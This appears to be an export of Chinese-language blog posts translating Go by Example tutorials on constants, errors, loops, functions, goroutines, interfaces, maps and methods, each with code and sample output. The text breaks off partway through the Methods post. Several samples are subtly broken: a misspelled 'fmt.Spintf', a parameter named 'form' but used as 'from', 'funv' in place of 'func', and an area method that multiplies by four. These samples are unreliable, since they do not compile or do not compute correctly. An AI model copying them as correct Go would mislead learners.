<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$: go run constant.go</span><br><span class="line">constant</span><br><span class="line">6e+11</span><br><span class="line">600000000000</span><br><span class="line">-0.28470407323754404</span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/constants">Go by Example: Constants</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Errors</title>
    <url>/2017/08/02/go-by-example-error/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Errors"><a href="#Go-by-Example-Errors" class="headerlink" title="Go by Example: Errors"></a><center>Go by Example: Errors</center></h2><p>golang中通过显式、单独的返回值来标识错误是一种常用的语言习惯。这与java和ruby等语言中使用的异常或C语言中有时使用重载单个返回值／错误是不同的。golang的这种处理方式很容易获取方法中返回的错误并且与其他没有返回错误的情况有相同的语句结构。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 按照惯例，错误一般作为最后一个返回值，并且是内置的error类型</span></span><br><span class="line"><span class="comment">// errors.New创建一个以给定字符串为值的error</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f1</span><span class="params">(arg <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> arg == <span class="number">42</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, errors.New(<span class="string">&quot;Can&#x27;t work with 42&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// nil标识没有错误返回</span></span><br><span class="line">    <span class="keyword">return</span> arg + <span class="number">3</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以通过定义一个实现了Error方法的类型作为error类型</span></span><br><span class="line"><span class="comment">// 该Error方法会打印出struct的两个变量</span></span><br><span class="line"><span class="keyword">type</span> argError <span class="keyword">struct</span> &#123;</span><br><span class="line">    arg <span class="type">int</span></span><br><span class="line">    prob <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *argError)</span></span> Error() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Spintf(<span class="string">&quot;%d - %s&quot;</span>, e.arg, e.prob)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用&amp;argError构造一个struct，作为error类型值返回</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f2</span><span class="params">(arg <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> arg == <span class="number">42</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>, &amp;argError&#123;arg, <span class="string">&quot;can&#x27;t work with it&quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> arg + <span class="number">3</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 下面的两个循环测试了两个会返回error值的函数</span></span><br><span class="line">    <span class="keyword">for</span> _, i := <span class="keyword">range</span> []<span class="type">int</span>&#123;<span class="number">7</span>, <span class="number">42</span>&#125; &#123;</span><br><span class="line">        <span class="keyword">if</span> r, e := f1(i); e != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;f1 failed: &quot;</span>, e)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;f1 worked:&quot;</span>, r)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> _, i := <span class="keyword">range</span> []<span class="type">int</span>&#123;<span class="number">7</span>, <span class="number">42</span>&#125; &#123;</span><br><span class="line">        <span class="keyword">if</span> r, e := f2(i); e != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;f2 failed:&quot;</span>, e)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;f2 worked:&quot;</span>, r)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果要使用返回的自定义error数据，你需用断言的方式判断该返回值是自定义error的一个实例</span></span><br><span class="line">    _, e := f2(<span class="number">42</span>)</span><br><span class="line">    <span class="keyword">if</span> ae, ok := e.(*argError); ok &#123;</span><br><span class="line">        fmt.Println(ae.arg)</span><br><span class="line">        fmt.Println(ae.prob)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run errors.go</span><br><span class="line">f1 worked: 10</span><br><span class="line">f1 failed: can\<span class="string">&#x27;t work with 42</span></span><br><span class="line"><span class="string">f2 worked: 10</span></span><br><span class="line"><span class="string">f2 failed: 42 - can\&#x27;</span>t work with it</span><br><span class="line">42</span><br><span class="line">can\<span class="string">&#x27;t work with it</span></span><br></pre></td></tr></table></figure>


<p>延伸阅读：<a href="https://blog.golang.org/error-handling-and-go">Error handling and Go</a></p>
<p>原文链接：<a href="https://gobyexample.com/errors">Go by Example: Errors</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - For</title>
    <url>/2017/07/10/go-by-example-for/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-For"><a href="#Go-by-Example-For" class="headerlink" title="Go by Example: For"></a><center>Go by Example: For</center></h2><p><code>for</code>是golang唯一的循环结构。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 最常见的形式，只有一个条件。类似于PHP中的while循环</span></span><br><span class="line">    i := <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i &lt;= <span class="number">3</span> &#123;</span><br><span class="line">        fmt.Println(i)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 经典的for循环</span></span><br><span class="line">    <span class="keyword">for</span> j := <span class="number">7</span>; j &lt;= <span class="number">9</span>; j++ &#123;</span><br><span class="line">        fmt.Println(j)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不带任何条件的for循环，类似于PHP中的while(true)循环。除非从函数内部break或return，否则会一直循环下去。</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;loop&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// continue关键字，同PHP。停止此次循环的执行，直接进入下一次循环。</span></span><br><span class="line">    <span class="keyword">for</span> n:= <span class="number">0</span>; n &lt;= <span class="number">5</span>; n++ &#123;</span><br><span class="line">        <span class="keyword">if</span> n%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(n)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run for.go</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">loop</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/for">Go by Example: For</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Functions</title>
    <url>/2017/07/12/go-by-example-function/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Functions"><a href="#Go-by-Example-Functions" class="headerlink" title="Go by Example: Functions"></a><center>Go by Example: Functions</center></h2><p>函数是golang的核心。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收两个int类型的参数，并返回两者之和。</span></span><br><span class="line"><span class="comment">// golang的函数需要显式的return。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">plus</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个同样类型的参数简便的定义。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">plusPlus</span><span class="params">(a, b, c <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    res := plus(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;1+2=&quot;</span>, res)</span><br><span class="line"></span><br><span class="line">    res = plusPlus(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;1+2+3=&quot;</span>, res)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run functions.go </span><br><span class="line">1+2 = 3</span><br><span class="line">1+2+3 = 6</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/functions">Go by Example: Functions</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Goroutines</title>
    <url>/2017/08/03/go-by-example-goroutine/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Goroutines"><a href="#Go-by-Example-Goroutines" class="headerlink" title="Go by Example: Goroutines"></a><center>Go by Example: Goroutines</center></h2><p>golang中的goroutine是一个比线程还要轻量的调度单位。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">(form <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        fmt.Println(from, <span class="string">&quot;:&quot;</span>, i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 常用的函数调用方式，同步执行</span></span><br><span class="line">    f(<span class="string">&quot;direct&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用go关键字来启动goroutine执行函数，跟正在执行的函数调用并行执行</span></span><br><span class="line">    <span class="keyword">go</span> f(<span class="string">&quot;goroutine&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以启动goroutine执行匿名函数</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(msg <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">        fmt.Println(msg)</span><br><span class="line">    &#125;(<span class="string">&quot;going&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 上面两个go启动的函数调用在独立的goroutine中异步执行</span></span><br><span class="line">    <span class="comment">// 下面Scanln函数在接收到外界一个输入时结束程序</span></span><br><span class="line">    <span class="keyword">var</span> input <span class="type">string</span></span><br><span class="line">    fmt.Scanln(&amp;input)</span><br><span class="line">    fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 从输出的结果，匿名函数的输出插入在第一个goroutine的输出中，可看出两个函数调用是在独立的goroutine中并行执行</span><br><span class="line">$ go run goroutines.go</span><br><span class="line">direct : 0</span><br><span class="line">direct : 1</span><br><span class="line">direct : 2</span><br><span class="line">goroutine : 0</span><br><span class="line">going</span><br><span class="line">goroutine : 1</span><br><span class="line">goroutine : 2</span><br><span class="line">&lt;enter&gt;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/goroutines">Go by Example: Goroutines</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Hello world</title>
    <url>/2017/07/10/go-by-example-helloworld/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Hello-world"><a href="#Go-by-Example-Hello-world" class="headerlink" title="Go by Example: Hello world"></a><center>Go by Example: Hello world</center></h2><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 直接运行go文件</span><br><span class="line">$ go run hello-world.go</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line">// 编译go文件，生成可执行的二进制文件，生成的文件名默认同源文件名</span><br><span class="line">$ go build hello-world.go</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">hello-world hello-world.go</span><br><span class="line"></span><br><span class="line">// 执行编译好的可执行文件</span><br><span class="line">$ ./hello-world</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>

<p>即go文件可直接通过<code>go run golang_file</code>运行，可以通过编译为二进制文件方式运行。</p>
<p>原文链接：<a href="https://gobyexample.com/hello-world">Go by Example: Hello World</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - If/Else</title>
    <url>/2017/07/10/go-by-example-if-else/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-If-Else"><a href="#Go-by-Example-If-Else" class="headerlink" title="Go by Example: If/Else"></a><center>Go by Example: If/Else</center></h2><p>goalng中的if条件语句可以省略括号，但是大括号不能少。而且golang没有常用的三元运算符<code>?:</code>, 所以必须用if来实现。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 经典的if／else</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">7</span>%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;7 is even&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;7 is odd&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">8</span>%<span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;8 is divisible by 4&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 条件判断语句前可以执行一条语句（简直酷毙了），并且定义的变量可以在所有条件分支引用</span></span><br><span class="line">    <span class="keyword">if</span> num := <span class="number">9</span>; num &lt; <span class="number">0</span> &#123;</span><br><span class="line">        fmt.Println(num, <span class="string">&quot;is negative&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> num &lt; <span class="number">10</span> &#123;</span><br><span class="line">        fmt.Println(num, <span class="string">&quot;has 1 digit&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fmt.Println(num, <span class="string">&quot;has multiple digits&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run if-else.go </span><br><span class="line">7 is odd</span><br><span class="line">8 is divisible by 4</span><br><span class="line">9 has 1 digit</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/if-else">Go by Example: If/Else</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Interfaces</title>
    <url>/2017/08/01/go-by-example-interface/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Interfaces"><a href="#Go-by-Example-Interfaces" class="headerlink" title="Go by Example: Interfaces"></a><center>Go by Example: Interfaces</center></h2><p>golang中接口被定义为一系列方法的集合。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;math&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个基本几何图形的接口</span></span><br><span class="line"><span class="keyword">type</span> geometry <span class="keyword">interface</span> &#123;</span><br><span class="line">    area() <span class="type">float64</span></span><br><span class="line">    perim() <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义两个结构体 rect和circle 实现这个接口</span></span><br><span class="line"><span class="keyword">type</span> rect <span class="keyword">struct</span> &#123;</span><br><span class="line">    width, height <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> circle <span class="keyword">struct</span> &#123;</span><br><span class="line">    radius <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// golang中实现一个接口类型，只需实现该接口所有的方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r rect)</span></span> area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.width * r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r rect)</span></span> perim() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*r.width + <span class="number">2</span>*r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c circle)</span></span> area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.Pi * c.radius * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c circle)</span></span> perim() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * math.Pi * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果一个变量实现了一个接口类型，则该变量可以调用接口所有的方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">measure</span><span class="params">(g geometry)</span></span> &#123;</span><br><span class="line">    fmt.Println(g)</span><br><span class="line">    fmt.Println(g.area())</span><br><span class="line">    fmt.Println(g.perim())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    r := rect&#123;width: <span class="number">3</span>, height: <span class="number">4</span>&#125;</span><br><span class="line">    c := circle&#123;radius: <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">    measure(r)</span><br><span class="line">    measure(c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run interfaces.go</span><br><span class="line">&#123;3 4&#125;</span><br><span class="line">12</span><br><span class="line">14</span><br><span class="line">&#123;5&#125;</span><br><span class="line">78.53981633974483</span><br><span class="line">31.41592653589793</span><br></pre></td></tr></table></figure>


<p>延伸阅读: <a href="http://jordanorelli.tumblr.com/post/32665860244/how-to-use-interfaces-in-go">how-to-use-interfaces-in-go</a></p>
<p>原文链接：<a href="https://gobyexample.com/interfaces">Go by Example: Interfaces</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Maps</title>
    <url>/2017/07/11/go-by-example-map/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Maps"><a href="#Go-by-Example-Maps" class="headerlink" title="Go by Example: Maps"></a><center>Go by Example: Maps</center></h2><p>map是golang内置关联数组类型，在其他语言中也被称为hash或字典。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用内置的make函数定义一个map，`make(map[key-type]val-type)`</span></span><br><span class="line">    <span class="comment">// 根据索引赋值</span></span><br><span class="line">    m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">    m[<span class="string">&quot;k1&quot;</span>] = <span class="number">7</span></span><br><span class="line">    m[<span class="string">&quot;k2&quot;</span>] = <span class="number">13</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;map:&quot;</span>, m)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据索引取值</span></span><br><span class="line">    v1 := m[<span class="string">&quot;k1&quot;</span>]</span><br><span class="line">    fmt.Println(<span class="string">&quot;v1:&quot;</span>, v1)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取map的长度</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;len:&quot;</span>, <span class="built_in">len</span>(m))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内置delete函数删除map中的元素</span></span><br><span class="line">    <span class="built_in">delete</span>(m, <span class="string">&quot;k2&quot;</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;map:&quot;</span>, m)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取map中某个索引对应的值。</span></span><br><span class="line">    <span class="comment">// 返回的第一个值是map中对应的值，如果存在的话，否则是map的元素类型的零值。</span></span><br><span class="line">    <span class="comment">// 返回的第二值可选，如果k2在m中，prs为true。否则，prs为false，并且返回的第一个值是map的元素类型的零值。</span></span><br><span class="line">    <span class="comment">// 该例中省略了第一个返回值。这种用法可以用来判断某个key是否在map中存在，如果直接使用第一返回值是无法判断返回的零值是因为key不存在还是该key对应的元素刚好是零值。</span></span><br><span class="line">    _, prs := m[<span class="string">&quot;k2&quot;</span>]</span><br><span class="line">    fmt.Println(<span class="string">&quot;prs:&quot;</span>, prs)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// map也可以如其他元素一样定义和初始化赋值一起。</span></span><br><span class="line">    n := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;<span class="string">&quot;foo&quot;</span>: <span class="number">1</span>, <span class="string">&quot;bar&quot;</span>: <span class="number">2</span>&#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;map:&quot;</span>, n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run maps.go </span><br><span class="line">map: map[k1:7 k2:13]</span><br><span class="line">v1:  7</span><br><span class="line">len: 2</span><br><span class="line">map: map[k1:7]</span><br><span class="line">prs: <span class="literal">false</span></span><br><span class="line">map: map[foo:1 bar:2]</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/maps">Go by Example: Maps</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Methods</title>
    <url>/2017/08/01/go-by-example-method/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Methods"><a href="#Go-by-Example-Methods" class="headerlink" title="Go by Example: Methods"></a><center>Go by Example: Methods</center></h2><p>golang支持在结构体上定义方法。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> rect <span class="keyword">struct</span> &#123;</span><br><span class="line">    width, height <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在rect的引用类型上定义一个area方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *rect)</span></span> area() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*r.width * <span class="number">2</span>*r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以将方法定义在结构体上</span></span><br><span class="line">funv (r rect) perim() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*r.width + <span class="number">2</span>*r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    r := rect&#123;width: <span class="number">10</span>, height: <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用结构体来调用两个方法</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;area: &quot;</span>, r.area())</span><br><span class="line">    fmt.Println(<span class="string">&quot;perim: &quot;</span>, r.perim())</span><br><span class="line"></span><br><span class="line">    rp := &amp;r</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// golang会在方法调用时在结构体和引用之间自动转换，你可能希望使用指针来避免方法调用时的值传递，并且可以在方法内修改传入的结构体的值</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;area: 